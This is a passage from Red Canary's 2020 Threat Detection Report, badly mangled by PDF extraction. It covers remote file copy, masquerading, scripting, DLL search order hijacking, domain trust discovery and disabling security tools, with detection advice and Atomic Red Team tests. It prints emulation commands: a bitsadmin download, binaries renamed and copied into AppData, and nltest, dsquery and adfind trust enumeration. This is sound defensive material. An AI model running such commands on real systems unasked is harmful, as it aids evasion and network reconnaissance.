TRATEGIS TShane Welcher 
DETECTIO NE NGINEE RThe detection strategies in this section were broughtto you by Shane Welcher! Shane has a wide range ofsecurity experience: data analysis, forensics, debuggingmalware, penetration testing, and network and systemadministration. He is passionate about open sourceprojects and was the highest community contributor to theAtomic Red Team GitHub project before joining Red Canary.322020 Threat Detection ReportT ECHNIQU ET 1 1 0 5Remote File CopyRemote File Copy is fundamentally similar to Windows Admin Shares, and so the popularity of the ETERNALBLUE exploit 
among adversaries probably plays a substantial role in its prominence.29%ORGANIZATIONSAFFECTE D1,393C ONFIRMEDTHREATS\#5O VERALLRAN KAnalysis20181920195Change14Climbing from 19th in 2018 to fifth in 2019,Remote File Copy saw substantial upticks inboth percentage of total threat volume and inthe number of customers affected.Why do adversaries use Remote File Copy?Living\-off\-the\-land techniques are popular because many of the tools that an adversary might need to conduct a successfulattack are installed on machines by default. However, not all exploitation tools exist natively on all systems. Adversariesleverage the Remote File Copy technique to deploy binaries from a command and control (C2\) server to a victim machineor between systems in a compromised environment. As these examples suggest, the technique falls under both theCommand and Control and Lateral Movement tactics.Like certain other techniques on this list, Remote File Copy is a technique of necessity. Adversaries often have to copy filesbetween remote systems if they want to accomplish their objectives. As a result, we see many prominent malware familiesleveraging Remote File Copy. MITRE ATT\&CK lists nearly 200 threat groups and malware samples, but some prominentexamples include:AstarothBundlore332020 Threat Detection ReportDyreEmotetnjRATPlugXShlayerSmokeLoaderTrickBotWannacryT HREA TV OLUM EHow do adversaries use Remote File Copy?While there are many broad and specific adversarial use cases for it, much of the Remote File Copy activity we observerelates to server message block (SMB) scanning and Lateral Movement.Some other behaviors that are commonly associated with Remote File Copy include:Downloading binaries over HTTPHTTPSDownloading binaries using built\-in operating system tools such as PowerShell, certutil.exe, wgetcurl,and BITSbitsadmin, among othersEmerging tacticsThreats may rely on download cradles that are not new but are less prevalentsuch as a Python urllib downloadtoperform Remote File Copy.Sighted withRemote File Copy occurs in tandem with many other techniques, most frequently with Windows Admin Shares (T1077\).BITS Jobs (T1197\) is another technique that is conceptually similar and frequently occurs in tandem with Remote File Copy.Exfiltration Over Alternative Protocol (T1048\) and Data Staged (T1074\) are additional techniques that frequently show upwith Remote File Copy, suggesting that the technique occasionally plays a role in exfiltration.342020 Threat Detection ReportWe also observe a high volume of detections where Remote File Copy occurs with Process Injection (T1055\) and a smallervolume occurring with Disabling Security Tools (T1089\), both likely due to TrickBot. Some other interesting associationsinclude DLL Search Order Hijacking (T1038\), Domain Trust Discovery (T1482\), and Process Hollowing (T1093\).CUSTOMER SA FFECTE DDefinitionT 1 1 0 5 :REMOT EF IL EC OP YFiles may be copied from one system to another to stage adversary tools or other files over the course of an operation.Files may be copied from an external adversary\-controlled system through the Command and Control channel to bringtools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied overon Mac and Linux with native tools like scp, rsync, and sftp. Adversaries may also copy files laterally between internalvictim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as filesharing over SMB to connected network shares or with authenticated connections with Windows Admin Shares orRemote Desktop Protocol.Detection 
MITREs data sourcesFile monitoringPacket captureProcess use of networkNetflowEnclave netflowNetwork protocol analysisProcess monitoring352020 Threat Detection ReportCollection requirementsIn addition to those data sources listed by MITRE ATT\&CK, security teams should consider collecting from thefollowing log sources:Firewall logsDatabase logsEmail logsNetflowEnclave netflow and network protocol analysisNetwork protocol analysis andor Netflow will have the best chance to detect remote file transfers because, by definition, aRemote File Copy will have to traverse the network.Process monitoringProcess monitoring serves as an excellent supplement to network\-based monitoring. Since its host based, this datasource isnt as easily affected by the evasion techniques that adversaries often use to subvert network\-based securitytechnologies, such as encryption or the misuse of network protocols.Detection SuggestionsYoull want to establish a baseline for expected network activity and then alert on unusual network usage basedon the following:Destination\-source objectsData volumeProtocolOther network traffic characteristicsThis has been particularly effective in detecting data exfiltration. As an example, Red Canary had detected more than 1,000confirmed threats this year based on detection and analysis of an excessive number of SMB sessions.In terms of process data, there are a number of operating system\-level commands that are capable ofbut unusualmechanisms forfile transfer. Some examples include the use of:Python web server and curlNetcatOpenSSL for encrypted file transfersExamining telemetry for these unusual events can be an effective way to detect malicious Remote File Copies. That said,most adversaries will only resort to using these unusual mechanisms for file transfer if more typical onessuch as file362020 Threat Detection Reporttransfer protocol (FTP) and secure copy protocol (SCP)are not available.In addition, any non\-native applications that establish network connections should be viewed with suspicion. The nearly200 threats that MITRE ATT\&CK lists for this technique include numerous examples that may be detectable in this way.Weeding out false positivesFalse positive rates for detecting malicious Remote File Copying will vary widely from one environment to the next. Forexample, a public FTP server might generate an excessive number of alerts for suspicious FTP connections, so analyticsbased on any data source will need to be tuned for the environment in which theyre deployed. In some environments,connections to network printers may skew the expected network connections for system processes such as Notepad.The two data sources suggested above (network and process data) probably have the greatest capacity to generate falsepositives if you fail to tune them. In general, process data is easier to tune, since it tends to include more context (e.g usercontext, frequency analysis, and process ancestry) that can be used to determine behavior and intent.TestingStart testing your defenses against Remote File Copy using Atomic Red Teaman open source testing framework of small,highly portable detection tests mapped to MITRE ATT\&CK.372020 Threat Detection ReportGetting startedView Atomic tests for T1105: Remote File Copy. In most environments, these should be sufficient to generate a useful signalfor defenders.Run this test on a Windows system using Command Prompt:C:WindowsSystem32bitsadmin.exe transfer qcxjb7 Priority HIGHhttps:raw.githubusercontent.comredcanarycoatomic\-red\-teammasterLICENSE.txt Atomic\-license.txtUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringbitsadmin.exeProcess command linetransfer qcxjb7, and the presence of a URLFile monitoringcreation of Atomic\-license.txtNetwork connectionto remote site: https:raw.githubusercontent.comredcanarycoatomic\-red\-teammasterLICENSE.txt382020 Threat Detection ReportReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TDel Armstrong 
DETECTIO NE NGINEE RThe detection strategies in this section were brought to youby Del Armstrong! Del has an extensive history working inIT, including 15 years focused on computer security. He hasa masters in computer science and expertise in LinuxUnix,SOC team training, and various programming languages.392020 Threat Detection ReportT ECHNIQU ET 1 0 3 6MasqueradingThere is no specific threat that explains the prominence of masquerading across our customers. However, the technique is 
versatile, broad, and effective, so it makes sense as a staple among a variety of adversaries6O VERALLRAN KAnalysis2018534%ORGANIZATIONSAFFECTE D1,042C ONFIRMEDTHREAT S20196Change1The number of customers that received a threatdetection associated with Masquerading wasfar higher in 2019 than in 2018, while totalthreat volume was mostly constant.Why do adversaries use Masquerading?Like many of the techniques on this list, Masquerading is a broad one that encompasses many common and effectiveadversary behaviors. This includes everything from manipulating binary metadata to subverting expected execution pathsto changing process names and much more. In fact, several other ATT\&CK techniquessuch as Process Injection (T1055\),Process Hollowing (T1093\), or even Timestomping (T1099\)could be considered forms of Masquerading.Masquerading allows adversaries to manipulate expected names and file paths to circumvent security controls, especiallywhen they are reliant on filenames and process paths to observe, detect, or otherwise prevent threats. For example,its trivial to detect an adversary executing a binary named mimikatz.exe. As such, when adversaries want to dumpcredentials with Mimikatz, renaming the tool is essentially a prerequisite for successful credential theft.While Masquerading is an important technique for deceiving tools and controls, it is also used to prey on analytical bias byrenaming malicious files so they seem to be benign. Casual observers of Masquerading processes may quickly dismiss theseas normal behaviors on Windows, macOS, or Linux\-based systems.402020 Threat Detection ReportT HREA TV OLUM EHow do adversaries use Masquerading?Masquerading can manifest on an endpoint in a wide variety of ways. Adversaries commonly:Modify binary metadata by renaming files and adding seemingly legitimate information, such as softwaredescriptions and copyright informationManipulate file locations or pathsRename legitimate processes or move them to different directoriesImitate Windows system processes such as lsass.exe, userinit.exe, and svchost.exeMasquerade executables as documents by replacing application icons with document icons or by appendingexecutables with multiple extensions (e.g malware.txt.exe)Emerging tacticsLately weve started to observe some novel examples of masquerading on Linux systems. Adversaries have deployed kernelthread Masquerading using process names such as kworkerds, kauditd, and others that make defenders think twiceabout removing components of malware.Sighted withMany of the techniques we commonly spot alongside Masquerading are associated with otherwise prevalent threats thathappen to occur in conjunction with Masquerading. The most prominent example of this is TrickBot, which explains whyMasquerading occurs in tandem with the following:Process Injection (T1055\)Windows Admin Shares (T1077\)Remote File Copy (T1105\)Domain Trust Discovery (T1482\)412020 Threat Detection ReportC USTOMER SA FFECTE DDefinitionT 1 0 3 6 :MASQUERADIN GMasquerading occurs when the name or location of an executable, legitimate or malicious, is manipulated or abusedfor the sake of evading defenses and observation. Several different variations of this technique have been observed.Adversaries may modify a binarys metadata, including such fields as icons, version, name of the product, description,and copyright, to better blend in with the environment and increase chances of deceiving a security analyst or product.Detection 
MITREs data sourcesFile monitoringProcess monitoringBinary file metadataCollection requirementsCommand\-line parametersWhile ATT\&CK doesnt list it as a related data source, security teams should consider monitoring process command\-line422020 Threat Detection Reportparameters, which are often useful for comparing legitimate command lines to suspicious ones. For example, observingthe \-accepteula command\-line parameter can be an indicator that a Microsoft Sysinternals tool has been renamed tomasquerade as something else. However, you can also expect to see the\-accepteula command\-line parameter anytime auser runs a new tool, when a tool runs in a new user context, or for many of the other reasons that a user might be expectedto accept a license agreement.Binary file metadataThat said, binary file metadata is probably the most useful data source for observing threats that leverage Masquerading.Certain elements of a binarys metadatainternal names and signature information are good examplesare reliableindicators of Masquerading.Detection suggestionsBinary file metadataSecurity teams should consider taking a close look at code signatures. Many operating systems sign binaries in a consistentmanner, and we can use EDR platforms and other tools to consistently identify signature discrepancies.Building on that, its possible to create an inventory of known system binaries, which you can then query for anomalies.For example, you can build a query that looks for unsigned versions of legitimate processessuch as svchost.exe. Whilethis would fail to uncover signed malware, you can solve that problem by running a similar query that looks for legitimateWindows processes that are signed by an authority other than Microsoft.While a process can be readily renamed, its binary metadata contains a field for internal name that is often a goodindicator of a processs true identity. It might make sense to compile a list of the internal names for system processes. Youcan then cross\-reference that list with the internal names for processes executing in your environment, identifying caseswhere a processs internal name deviates from whats expected for that process.As we noted in the analysis section above, adversaries frequently rename legitimate processes to circumvent securitycontrols that ignore metadata and focus primarily on process names. In this way, it also makes sense to search forinstances where a known internal name is associated with an unexpected process. For example, one variant of thecommon Sticky Keys attack involves replacing the file sethc.exean Accessibility Feature native to Windowswith arenamed copy of cmd.exe, the Windows Command Prompt. The masquerading binary is still named sethc.exe, however,the internal name will now indicate the true identity of the file.File monitoringLook for whitelisted processes that execute from unexpected paths; this is particularly useful for organizations that deploystandardized operating system images to their employees computers. Again, you can compile lists of the paths thatlegitimate processes typically execute from and alert on processes that execute from unexpected file paths.432020 Threat Detection ReportWeeding out false positivesWhile file paths can be useful for detection, they can also be prone to false positives in certain cases. For example, differentversions of operating systems may store the same processes in different file paths. If this is an issue in your organization,you may be able to decrease false positives by excluding some of these commonly observed paths from your detectionqueries over time.If you dont have in\-depth access to binary metadata at scale, you can improvise slightly with a working knowledge ofoperating system internals. If you understand the roles and process ancestry of common Windows processes (shown in theSANS Hunt Evil Poster), you can perform quick checks to see if there are abnormalities in a single executing process. This isslightly more difficult on macOS and Linux systems, but still workable with some time in a test lab.TestingStart testing your defenses against Masquerading using Atomic Red Teaman open source testing framework of small,highly portable detection tests mapped to MITRE ATT\&CK.442020 Threat Detection ReportGetting startedView Atomic tests for T1036: Masquerading. In most environments, these should be sufficient to generate a useful signalfor defenders.Run this test on a Windows system using Command Prompt:copy %SystemRoot%System32cscript.exe %APPDATA%notepad.exe Ycmd.exe c %APPDATA%notepad.exe BUseful telemetry will include:DATA SOURCETELEMETRYBinary file metadataDoes notepad.exe have the correct signature and internal name?Process monitoringcmd.exe renamed to notepad.exeFile monitoring%APPDATA%notepad.exe452020 Threat Detection ReportReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TJustin Schoenfeld 
DETECTIO NE NGINEE RThe detection strategies in this section were brought toyou by Justin Schoenfeld! Justin is experienced in threathunting, incident response, and researching industry\-wide threat intelligence. He earned his B.A. in ComputingSecurity from the Rochester Institute of Technology, wherehe had the opportunity to co\-op for a large corporation anda startup company. His love for endpoint telemetry camefrom his experience as an advanced threat engineer for alarge global hospitality company.462020 Threat Detection ReportT ECHNIQU ET 1 0 6 4ScriptingAdversaries continue to evolve their use of Scripting in response to improved application controls. Routinely among our top 
threats, malicious scripts are performant, available, and inconspicuous7O VERALLRAN KAnalysis2018938%ORGANIZATIONSAFFECTE D838C ONFIRMEDTHREAT S20197Change2We observed slight increases in the prevalenceof Scripting from 2018 to 2019, both in terms ofthe percentage of organizations affected andthe percentage of total threat volume.Why do adversaries use Scripting?Scripting is a relatively broad technique that covers a wide array of behaviors, many of them involving the use of tools andlanguages that are functionally critical components of operating systems. Scripts are as versatile as they are ordinary,which makes it difficult to baseline normal scripting activity and build detection strategies for abnormal scripting activity.Because continued improvements to (and adoption of) application control solutions make it difficult to install a maliciousbinary on a host machine, scripts allow adversaries to perform actions without having to install anything. There is also noshortage of publicly available scriptsmalicious and benignthat administrators or adversaries can find on the internetand use to perform all variety of actions.472020 Threat Detection ReportT HREA TV OLUM EHow do adversaries use Scripting?Adversaries use scripts to perform actions on an endpoint. This might include using a script to download somethingfrom an external host, embedding a script in an email attachment as part of a phishing campaign, embedding binariesthat might be blocked into a script, or writing a script that automates and expedites otherwise tedious work that wouldhave to be done by hand.We routinely observe:Direct execution of local scripts via default scripting harnesses (e.g cscript.exe and wscript.exe)Execution of a script within a process that can execute scripts (e.g cmd.exe or PowerShell)Execution of processes such as rundll32\.exe with a script host schemeIdentification and exploitation of vulnerable, trusted scripts, such as pubprn.vbsThe adversary behaviors we observe most commonly involve Windows script hosts (e.g cscript.exe or wscript.exe) orother popular scripts (e.g JavaScript or Visual Basic Script) making network connections to an external host.Emerging tacticsSome less common malicious Scripting methods include:Adware and malware installers on macOS using obfuscated script content that deobfuscates at runtime (e.g Shlayerand Bundlore)Scripts that are dynamically created at runtime (e.g impacket smbexec does this to write commands to disktemporarily)Sighted withWe frequently detect adversaries using Scripting in conjunction with other techniques, most notably Mshta (T1170\) andDeobfuscateDecode Files or Information (T1140\). Mshta can be used as a proxy to execute scripts and, as a result, wehave a high volume of analytics that trigger on and map to both Scripting and Mshta\-related activity. Co\-occurence withDeobfuscateDecode Files or Information is more obvious, as it is commonplace for adversaries to obfuscate their scripts.482020 Threat Detection ReportC USTOMER SA FFECTE DDefinitionT 1 0 6 4 :SCRIPTIN GAdversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual.Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources.Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with theoperating system at an API level instead of calling other programs. Common scripting languages for Windows includeVBScript and PowerShell, but could also be in the form of command\-line batch scripts.Detection 
MITREs data sourcesProcess monitoringFile monitoringProcess command\-line parametersCollection requirementsFor all the various ways an adversary might leverage Scripting, there are two general approaches for gathering the visibilityneeded to detect and investigate Scripting activity. For one, you can target malicious use of Scripting by focusing on themeans of execution. Valuable data sources for this approach include:492020 Threat Detection ReportProcess monitoring (including process network actions and module loads)Process command\-line parametersAlternatively, you could also focus on data sources that help with detecting and investigating the actual contents ofmalicious scripts. In this case, its critically important to monitor files and collect the actual scripts. While this will almostcertainly be time intensiveboth in terms of machine processing and analysisit will also provide important context.Detection suggestionsWeve produced effective analytics by focusing on script host process telemetry. Specifically, it makes sense to look out forabnormal activity emanating from processes that are capable of running scripts. Such abnormal activity might include:Establishment of persistence mechanismsMaking network connectionsUnexpected process ancestryYou may want to look for wscript.exe or cscript.exe spawning from command shells (e.g cmd.exe or powershell.exe), Officeapplications, web browsers, and web service handlers. Also look out for scripts executing from unusual locations, includinguser\-writable paths and temporary directories.Some adversaries attempt to execute scripts from hosts in abnormal ways, so its a good idea to monitor for suspiciousmodule loads of binaries related to hosting scripts (e.g vbscript.dll).Weeding out false positivesWhile you will almost certainly find malice by alerting on scripting engines that make external network connections, doingso will also overwhelm you and your team with a high volume of false positives. As always, be specific in your detectionlogic and robust in your suppression logic, so you can control false positives while casting an effectively wide net forsuspicious activity.502020 Threat Detection ReportTestingStart testing your defenses against Scripting using Atomic Red Teaman open source testing framework of small, highlyportable detection tests mapped to MITRE ATT\&CK.Getting startedView Atomic tests for T1064: Scripting. In most environments, these should be sufficient to generate a useful signalfor defenders.Run this test on a Windows system using PowerShell:New\-Item $env:TEMPT1064 \_ script.bat \-Force \| Out\-NullSet\-Content \-Path $env:TEMPT1064 \_ script.bat \-Value dirStart\-Process $env:TEMPT1064 \_ script.bat512020 Threat Detection ReportUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringpowershell.exe, cmd.exeFile monitoringwrite and execute from appdatalocaltempReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TKyle Rainey 
INTELLIGENC EA NALYS TThe detection strategies in this section were brought toyou by Kyle Rainey! Kyle has been providing proactiveand reactive incident response and forensics servicesto Fortune 500 companies for over five years. He hasextensive experience working with organizations tostrengthen their security postures and security operations.At Red Canary, he helps engineer impactful, scalableintelligence products.522020 Threat Detection ReportT ECHNIQU ET 1 0 3 8DLL Search Order HijackingDridex infections are the main reason that we observe high levels of DLL Search Order Hijacking in the environments we 
monitor. However, weve also observed Emotet and PlugX leveraging the technique.16%ORGANIZATIONSAFFECTE D788C ONFIRMEDTHREATS\#8O VERALLRAN KAnalysis20187520198Change67Rising from 75 to eight, DLL Search OrderHijacking is the most ascendant techniqueacross our customer base. This increase is likelythe result of improved detection abilities on ourend rather than a distinct rise in prevalence.Why do adversaries use DLL Search Order Hijacking?DLL Search Order Hijacking offers adversaries a reliable and often discreet method for persisting, elevating their privileges,and evading defensive controls. Rather than overtly installing a malicious binary, the adversary can introduce a maliciousDLL masquerading under a legitimate filename into the same subdirectory as a given legitimate process.When that process needs to conduct a specific action, it searches for the DLL with the legitimate name, first looking in thefolder in which it lives. Finding the malicious DLL in the same folder, it will load that library, thus giving the attacker codeexecution from within the legitimate host process. Most often, we observe a legitimate executable known to be vulnerableto hijacking dropped by the adversary along with the malicious DLL.DLL Search Order Hijacking is elusive, and its something weve historically struggled to detectboth specifically hereat Red Canary and more generally as an industry. However, as its rise in prevalence suggests, we made a lot of progressexpanding our detection coverage for the threat in 2019\.532020 Threat Detection ReportT HREA TV OLUM EHow do adversaries use DLL Search Order Hijacking?There are multiple ways that a DLL Search Order Hijack might unfold. One particularly common method involves theestablishment of a scheduled task that launches a seemingly legitimate executable that then loads the malicious DLL.Sighted withDLL Search Order Hijacking occurs most frequently in conjunction with Scheduled Task (T1053\) and Process Injection(T1055\), both likely the result of Emotet activity that often precedes a TrickBot infection. Slightly less often, we also seethe technique associated with Remote File Copy (T1105\), Windows Admin Shares (T1077\), and Domain Trust Discovery(T1482\), techniques that are more concretely linked to TrickBot. As such, we see the latter three techniques occurring inconjunction with DLL Search Order Hijacking slightly less often than the former two because we frequently detect andmitigate Emotet before it loads TrickBot.We also see the technique occur with Process Hollowing (T1093\), which is likely the result of Dridex activity.CUSTOMER SA FFECTE D542020 Threat Detection ReportDefinitionT 1 0 3 8 :DL LS EARC HO RDE RH IJACKIN GWindows systems use a common method to look for required DLLs to load into a program. Adversaries may takeadvantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalationand persistence.Detection 
MITREs data sourcesFile monitoringDLL monitoringProcess monitoringProcess command\-line parametersCollection requirementsThe most reliable data sources for observing DLL Search Order Hijacking are process monitoring and DLL load monitoring(in that order). These sources will allow you to observe when trusted processes deviate from ordinary, benign behavior,allowing you to track the cause of bad behaviors to specific DLLs.Detection suggestionsAgain, DLL Search Order Hijacking presents detection and prevention challenges to our entire industry, primarily becausethe technique proxies the execution of malicious content through a signed, trusted binary. The most helpful patterns weveseen so far are:Signed Microsoft binaries being written by cmd.exe to ProgramData or user AppData foldersSigned, trusted binaries executing from User AppData or ProgramData folders loading a single unsignedDLL from the same folderScheduled task creation to execute binaries from User AppData or ProgramData folders552020 Threat Detection ReportTrusted DLLs located in normal system paths such as kernel32\.dll or ntdll.dll located in abnormal foldersFrequency analysis on the least commonly found DLLs located outside of normal system foldersUnsigned DLLs written to suspicious folders such as Temp or AppDataYoull want to look for DLL loads emanating from apparently unusual locations and and figure out if these are normal inyour environment.Weeding out false positivesLooking for any generic process loading a DLL from its same folder sounds like a good idea. Unfortunately, this will createa high volume of false positives from Windows System32 and Program Files folders. Target your hunts to user\-writablefolders for the best results.TestingStart testing your defenses against DLL Search Order Hijacking using Atomic Red Teaman open source testing frameworkof small, highly portable detection tests mapped to MITRE ATT\&CK.562020 Threat Detection ReportGetting startedView Atomic tests for T1038: DLL Search Order Hijacking. In most environments, these should be sufficient to generate auseful signal for defenders.Run this test on a Windows system using Command Prompt:copy %windir%System32windowspowershellv1\.0powershell.exe%APPDATA%updater.exe copy %windir%System32amsi.dll %APPDATA%amsi.dll%APPDATA%updater.exe \-Command exitUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringpowershell.exeDLL Monitoringamsi.dll with incorrect filepathProcess command linepowershell.exe renaming itselfFile monitoringbinary metadata discrepancies for updater.exe and amsi.dll572020 Threat Detection ReportReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TJustin Schoenfeld 
DETECTIO NE NGINEE RThe detection strategies in this section were brought toyou by Justin Schoenfeld! Justin is experienced in threathunting, incident response, and researching industry\-wide threat intelligence. He earned his B.A. in ComputingSecurity from the Rochester Institute of Technology, wherehe had the opportunity to co\-op for a large corporation anda startup company. His love for endpoint telemetry camefrom his experience as an advanced threat engineer for alarge global hospitality company.582020 Threat Detection ReportT ECHNIQU ET 1 4 8 2Domain Trust DiscoveryThe majority of Domain Trust Discovery activity we observe results from TrickBot using nltest.exe to gather domain trust 
information from Active Directory for the purpose of lateral movement.13%ORGANIZATIONSAFFECTE D784C ONFIRMEDTHREATS\#9O VERALLRAN KAnalysis20183020199Change21Domain Trust Discovery was only added toATT\&CK in 2019\. We retroactively re\-mappedtwo discovery techniques, which collectivelyranked 30th in 2018, to T1482 while creatingthis report.Why do adversaries use Domain Trust Discovery?Added in February 2019, Domain Trust Discovery is a relatively new discovery technique in MITREs ATT\&CK matrix. InWindows environments, trust relationships play a critical role in determining who can access what resources. Domain TrustDiscovery more directly relates to the ways that one domain in a given network environment can either inherit trust fromor grant it toother domains, endpoints, and users in that environment.In order to determine which user accounts have access to what systems, an adversary has to understand the user accountsthat exist within a given domain and the trust relationships between that domain and others. As such, discovering domaintrust information is tremendously useful for an adversary or malware that is intent on moving laterally between systems ina compromised environment.592020 Threat Detection ReportT HREA TV OLUM EHow do adversaries use Domain Trust Discovery?In our dataset, the prevalence of Domain Trust Discovery is due entirely to TrickBot outbreaks in a relatively small numberof customer environments. The detection logic that alerts our detection engineering team to this aspect of TrickBot isdesigned to trigger when nltest.exe executes with certain command\-line options. A couple of those options include:domain\_trustsall\_trustsNltest is a native Microsoft command\-line tool that administrators often use to enumerate domain controllers (DC) anddetermine trust status between domains, to name a few important features.Outside of TrickBot, several popular post\-exploitation frameworks have the ability to perform Domain Trust Discovery,either through Windows APIs or Lightweight Directory Access Protocol (LDAP) queries:Empire and PowerSploit use the DsEnumerateDomainTrusts API calls, LDAP queries for(objectClass\=trustedDomain) when enumerating domain trusts, and the .NET method Forest.GetAllTrustRelationships() when enumerating forest trusts.PoshC2 uses Forest.GetAllTrustRelationships() from the System.DirectoryServices assembly as well.Other tools that can enumerate domain trusts are the native Microsoft command\-line tool dsquery and Adfind.exe, whichhas been used by FIN6 and Ryuk before to discover AD users and groups as well.You can read about some additional methods and explanations of Domain Trust Discovery on Will Schroeders blog.Sighted withLike many of the other techniques that owe their prominence on this list to TrickBot, this technique is frequentlyseen in tandem with:Scheduled Task (T1053\)Process Injection (T1055\)Windows Admin Shares (T1077\)Disabling Security Tools (T1089\)Remote File Copy (T1105\)602020 Threat Detection ReportC USTOMER SA FFECTE DDefinitionT 1 4 8 2 :DOMAI NT RUS TD ISCOVER YAdversaries may attempt to gather information on domain trust relationships that may be used to identify LateralMovement opportunities in Windows multi\-domainforest environments. Domain trusts provide a mechanism for adomain to allow access to resources based on the authentication procedures of another domain. Domain trusts allowthe users of the trusted domain to access resources in the trusting domain. The information discovered may help theadversary conduct SID\-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated usingthe DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to beused by adversaries to enumerate domain trusts.Detection 
MITREs data sourcesAzure activity logsOffice 365 account logsAPI monitoringProcess monitoringProcess command\-line parametersCollection requirementsWhile MITRE does not include it among its data sources, network logs for LDAP queries (typically port 389 over TCPUDP) are another good collection source for defenders seeking to observe Domain Trust Discovery activity. Security612020 Threat Detection Reportteams seeking to observe malicious instances of Domain Trust Discovery will also want to collect logs relating to processmonitoring and process command\-line parameters.Detection suggestionsThe analytics that will uncover Domain Trust Discovery attempts are relatively simple, but they vary in feasibility as yourenvironment scales. Most organizations can work to detect nltest.exe with these command lines:domain\_trustsall\_trustsIn a similar vein to nltest.exe, dsquery.exe can be used to enumerate domain trusts with the following command line:dsquery \* \-filter (objectClass\=trustedDomain) \-attr \*The ADFind tool can also be used to query domain trusts with the following command lines:adfind.exe \-f objectclass\=trusteddomainadfind.exe \-sc trustdmpIf you are able to collect and analyze LDAP queries, youll want to scrutinize any that originate from non\-DCs with thesubstring (objectClass\=trustedDomain), especially if other suspicious reconnaissance actions are identified.Weeding out false positivesLooking for generic detection of nltest.exe without specific command\-line options will lead you down some high\-volumepaths. The best route with this technique is to be specific.622020 Threat Detection ReportTestingStart testing your defenses against Domain Trust Discovery using Atomic Red Teaman open source testing framework ofsmall, highly portable detection tests mapped to MITRE ATT\&CK.Getting startedView Atomic tests for T1482: Domain Trust Discovery. In most environments, these should be sufficient to generate a usefulsignal for defenders.Run this test on a Windows system using Command Prompt:nltest domain \_ trusts632020 Threat Detection ReportUseful telemetry will include:DATA SOURCETELEMETRYProcess monitoringnltest.exeProcess command linedomain\_trustsReview and repeatNow that you have executed one or several common tests and checked for the expected results, its useful to answer someimmediate questions:Were any of your actions detected?Were any of your actions blocked or prevented?Were your actions visible in logs or other defensive telemetry?Repeat this process, performing additional tests related to this technique. You can also create and contribute testsof your own.DETECTIO NS TRATEGIS TThomas Gardner
DETECTIO NE NGINEE RThe detection strategies in this section were brought toyou by Thomas Gardner! At Red Canary, he splits his timeinvestigating threats to customers and developing newmethods of finding them. Previously, Thomas worked atCenturyLink in various roles spanning incident response,threat hunting, and threat intelligence.642020 Threat Detection ReportT ECHNIQU ET 1 0 8 9Disabling Security ToolsThe increased prevalence of adversaries Disabling Security Tools is attributable to specific and highly prevalent threats 
such as Emotet and TrickBot.23%ORGANIZATIONSAFFECTE D771C ONFIRMEDTHREATS\#10O VERALLRAN KAnalysis20188201910Change2Disabling Security Tools fell from eight in2018 to 10 in 2019, despite a slight increasein the percentage of total threat volume itaccounted for.Why do adversaries Disable Security Tools?Adversaries disable or tamper with security tools to enable activities that would otherwise be prevented, to avoiddetection, or both. In some cases, tools must be disabled in order to gain initial access to a system. In other cases, theymay be disabled to facilitate one or many additional tactics throughout the lifecycle of the intrusion. The security tools thatadversaries seek and disable, and the manner in which those tools are affected, vary widely.THREA TV OLUM E652020 Threat Detection ReportHow do adversaries Disable Security Tools?This technique is broad and can be used to capture the intent of many other techniques within the Defense Evasion tactic.As a result, the methods employed by adversaries are not always predictable. The targets of tampering are numerous butcommonly include:Endpoint protection suitesHost\-based firewallsEndpoint detection and response (EDR)Virtual private networking (VPN) configurationsPlatform security interfaces, such as the Antimalware Scan Interface (AMSI) on WindowsLogging mechanismsSecurity\-related kernel extensionsThe most commonly observed techniques include disabling local security controls, such as endpoint protection (antivirus)or host\-based firewalls. This may be done via software or by an operator.TrickBot and Emotet are two highly prevalent trojans that include a number of features aimed at detecting and disablingMicrosoft Windows Defender and Defender ATP, among other endpoint protection suites, rendering these endpointprotection products ineffective through changes to the registry or by leveraging built\-in system management utilities, suchas PowerShell. Similarly, Carbanak, NanoCore, and countless others will disable or modify local firewalls to ensure thatcommunications are not impeded.Emerging tacticsMore subtle but potentially much more damaging techniquessuch as AMSI bypasses and selective tampering of EDR,logging mechanisms, and other low\-level controlsare more prevalent in community research than they are in the wild.That said, we do know that they are being leveraged by adversaries. Evidence of this includes the use of tools such asfltMC.exe (a Windows system utility being used to unload minifilter drivers that are often a key pillar of data collection forantivirus), data loss prevention, and other monitoring tools on Windows systems.Lastly, the two classes of attack that are common among almost all controls are prevention or deletion of local loggingand the use of a wide variety of configuration changes that may result in local logs not being submitted to a central datacollector, such as a SIEM. Like this technique and others related to this tactic, these classes of attack may be used to affectall logging or log collection, or they may be targeted at collection of only certain event types that the adversary knows to beof concern.Emerging tacticsMasquerading (T1036\), for evasionScheduled Task (T1053\), likely used as a persistence mechanism to shield executionProcess Injection (T1055,) useful for unhooking security tools from malicious processes and hiding malicious codewithin legitimate processes to shield execution662020 Threat Detection ReportC USTOMER SA FFECTE DDefinitionT 1 0 8 9 :DISABLIN GS ECURIT YT OOL SAdversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form ofkilling security software or event logging processes, deleting Registry keys so that tools do not start at run time, or othermethods to interfere 